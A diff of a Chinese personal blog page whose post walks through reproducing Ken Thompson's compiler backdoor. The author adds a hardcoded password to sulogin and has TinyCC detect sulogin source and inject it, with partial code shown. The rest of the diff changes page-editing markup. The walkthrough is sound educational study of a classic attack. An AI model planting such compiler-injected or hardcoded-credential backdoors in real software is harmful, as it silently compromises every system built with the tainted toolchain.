@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../" aria-busy="true">
   <a href="../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../"
          data-navigation-hidden="false">
       
@@ -697,17 +697,52 @@
   
 
 
+<!-- blog-edit-start:6859383962180a56:b0 -->
+
 <h1 id="_1">给开源编译器插入后门</h1>
+<!-- blog-edit-end:6859383962180a56:b0 -->
+
 <div class="file-actions" data-image-edit-revision="6859383962180a56476d21ccc98c3777fce859d337ba66da960fdec5283314d7" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Ccompilebackdoor%5C%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Ccompilebackdoor" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\compilebackdoor\给编译器加后门.md">复制路径</span></div>
 
+<!-- blog-edit-start:6859383962180a56:b1 -->
+
 <p>这个是我在大四考研初试结束之后做的，当时是看到李博杰大神的文章，再加上这是来在经典的 KThmopson 的演讲文章，所以很感兴趣，就动手做了一下。其实不难，没想到后来在复试因为这个也能说上几句，感觉蛮巧的。</p>
+<!-- blog-edit-end:6859383962180a56:b1 -->
+
+<!-- blog-edit-start:6859383962180a56:b2 -->
+
 <h2 id="step-1-tcc-tinycc-01">Step 1: 编译TCC，测试是否正常使用 (tinycc-01)</h2>
+<!-- blog-edit-end:6859383962180a56:b2 -->
+<!-- blog-edit-start:6859383962180a56:b3 -->
+
 <p>tcc 就是简单版本的 C 语言编译器，这一步就是简单的下载 tcc 代码，然后用 gcc 之类的编译器编译安装。</p>
+<!-- blog-edit-end:6859383962180a56:b3 -->
+
+<!-- blog-edit-start:6859383962180a56:b4 -->
+
 <p>编译完成之用 tcc 去编译允许一个简单的 HelloWorld 测试程序即可。这里我遇到一个问题，就是 tcc 去编译其他程序时总是报错。后来排查是发现编译 tcc 没有使用 <code>--prefix</code>，这种问题其实回过头来看都是小白会犯的错。具体可以看<a href="../../../../Main/Debug/debug_011/">我的记录文章</a>。</p>
+<!-- blog-edit-end:6859383962180a56:b4 -->
+
+<!-- blog-edit-start:6859383962180a56:b5 -->
+
 <h2 id="step-2-sulogin-sulogin-01">Step 2: 编译sulogin，测试是否正常使用 (sulogin-01)</h2>
+<!-- blog-edit-end:6859383962180a56:b5 -->
+<!-- blog-edit-start:6859383962180a56:b6 -->
+
 <p>sulogin 是一个简单的登录程序。下载代码，用 tcc 编译，然后运行。这一步没遇到问题。</p>
+<!-- blog-edit-end:6859383962180a56:b6 -->
+
+<!-- blog-edit-start:6859383962180a56:b7 -->
+
 <h2 id="step-3-sulogin-sulogin-02">Step 3: 改造sulogin，测试是否可以通过 (sulogin-02)</h2>
+<!-- blog-edit-end:6859383962180a56:b7 -->
+<!-- blog-edit-start:6859383962180a56:b8 -->
+
 <p>然后我们就修改 sulogin，让它能通过我们设定的密码，其实这个就是一句话的事情，在第 600 行左右的地方这里比较密码的，所以我们加一句让我们自己的密码也通过。</p>
+<!-- blog-edit-end:6859383962180a56:b8 -->
+
+<!-- blog-edit-start:6859383962180a56:b9 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getpasswd</span><span class="p">(</span><span class="n">pwd</span><span class="o">-&gt;</span><span class="n">pw_passwd</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
 </span><span id="__span-0-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">            </span><span class="k">break</span><span class="p">;</span>
@@ -720,9 +755,24 @@
 </span><span id="__span-0-10"><span class="linenos" data-linenos="10 "></span><span class="w">        </span><span class="c1">// ...</span>
 </span><span id="__span-0-11"><span class="linenos" data-linenos="11 "></span><span class="w">    </span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:6859383962180a56:b9 -->
+
+<!-- blog-edit-start:6859383962180a56:b10 -->
+
 <h2 id="step-4-tcc-sulogin-tinycc-02">Step 4: 改造TCC，只考虑编译 sulogin 会进行修改(tinycc-02)</h2>
+<!-- blog-edit-end:6859383962180a56:b10 -->
+<!-- blog-edit-start:6859383962180a56:b11 -->
+
 <p>由于只是 demo，所以只需要编译的时候识别出是编译 sulogin，然后插入恶意代码就好。</p>
+<!-- blog-edit-end:6859383962180a56:b11 -->
+
+<!-- blog-edit-start:6859383962180a56:b12 -->
+
 <p>如果检测出编译的是 sulogin，由于是 demo，就直接简单地进行对比就行，修改的代码在 <code>tccpp.c</code> 的 <code>handle_eob</code> 函数，如下：</p>
+<!-- blog-edit-end:6859383962180a56:b12 -->
+
+<!-- blog-edit-start:6859383962180a56:b13 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos=" 1 "></span><span class="w">        </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="n">bf</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">bf</span><span class="o">-&gt;</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
 </span><span id="__span-1-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">login_match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;if (pwd-&gt;pw_passwd[0] == 0 ||&quot;</span><span class="p">;</span>
 </span><span id="__span-1-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">login_append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot; strcmp(p, </span><span class="se">\&quot;</span><span class="s">allen</span><span class="se">\&quot;</span><span class="s">) == 0 ||&quot;</span><span class="p">;</span>
@@ -747,17 +797,61 @@
 </span><span id="__span-1-22"><span class="linenos" data-linenos="22 "></span><span class="w">            </span><span class="p">}</span>
 </span><span id="__span-1-23"><span class="linenos" data-linenos="23 "></span><span class="w">        </span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:6859383962180a56:b13 -->
+
+<!-- blog-edit-start:6859383962180a56:b14 -->
+
 <p>上面的代码其实就是查看是否有 <code>login_match</code> 这个字符串，如果有就认为是编译的 sulogin，然后就把恶意代码 <code>login_append</code> 加入到要编译的 sulogin 中即可。</p>
+<!-- blog-edit-end:6859383962180a56:b14 -->
+
+<!-- blog-edit-start:6859383962180a56:b15 -->
+
 <h2 id="step-5-sulogin-sulogin-03">Step 5: 编译sulogin，测试是否正常使用 (sulogin-03)</h2>
+<!-- blog-edit-end:6859383962180a56:b15 -->
+<!-- blog-edit-start:6859383962180a56:b16 -->
+
 <p>这个没什么好说的，注意这里编译的 sulogin 是正常 sulogin，但是由于我们的 tcc 在编译的时候插入了恶意代码，所以最后仍然会有漏洞。</p>
+<!-- blog-edit-end:6859383962180a56:b16 -->
+
+<!-- blog-edit-start:6859383962180a56:b17 -->
+
 <h2 id="step-6-tcctcc-tinycc-03">Step 6: 改造TCC，考虑编译tcc 自身会进行修改 (tinycc-03)</h2>
+<!-- blog-edit-end:6859383962180a56:b17 -->
+<!-- blog-edit-start:6859383962180a56:b18 -->
+
 <p>这里现在想想也很简单，之前包括看参考资料是用的输出自身的程序，专业名字叫 Quine，但现在想想完全不需要。</p>
+<!-- blog-edit-end:6859383962180a56:b18 -->
+
+<!-- blog-edit-start:6859383962180a56:b19 -->
+
 <p>我就仿照 Step4 那样就可以了，根据字符串匹配，能够判断现在编译的是否是 tcc，如果是的话，那么就插入代码就好了，很简单。</p>
+<!-- blog-edit-end:6859383962180a56:b19 -->
+
+<!-- blog-edit-start:6859383962180a56:b20 -->
+
 <p>当时用的是输出自身的程序，现在看是没必要了，所以这个输出自身的程序的<a href="../../../../Main/输出自身的程序/">记录文件</a>就放到其他文件夹里面去吧。</p>
+<!-- blog-edit-end:6859383962180a56:b20 -->
+
+<!-- blog-edit-start:6859383962180a56:b21 -->
+
 <h2 id="step-7-tccsulogintinycc-03-sulogin-04">Step 7: 编译tcc，编译sulogin，测试tinycc-03 是否通过 (sulogin-04)</h2>
+<!-- blog-edit-end:6859383962180a56:b21 -->
+<!-- blog-edit-start:6859383962180a56:b22 -->
+
 <p>完成上面的任务，那接下来就顺理成章了。用恶意的 tcc 编译正常的 tcc，然后用编译得到的 tcc 再去编译 sulogin 即可。</p>
+<!-- blog-edit-end:6859383962180a56:b22 -->
+
+<!-- blog-edit-start:6859383962180a56:b23 -->
+
 <p>总结下来就是感觉听起来很牛逼，但实际还就是那样吧。本质上就是编译器的漏洞，也就是攻击者对于编译器要达到控制的程度才可以。这样用这种危险的编译器去编译其他，那么就会造成大范围杀伤。但是控制编译器又谈何容易呢？普通的编译器漏洞不会造成这种结果。</p>
+<!-- blog-edit-end:6859383962180a56:b23 -->
+
+<!-- blog-edit-start:6859383962180a56:b24 -->
+
 <p>参考：<a href="https://01.me/2014/11/insert-backdoor-into-compiler/">https://01.me/2014/11/insert-backdoor-into-compiler/</a></p>
+<!-- blog-edit-end:6859383962180a56:b24 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\compilebackdoor\给编译器加后门.md" data-text-edit-revision="6859383962180a56476d21ccc98c3777fce859d337ba66da960fdec5283314d7" data-text-edit-marker="6859383962180a56" data-text-edit-schema="1"></div>
 
 
 
@@ -989,8 +1083,6 @@
         <script src="../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
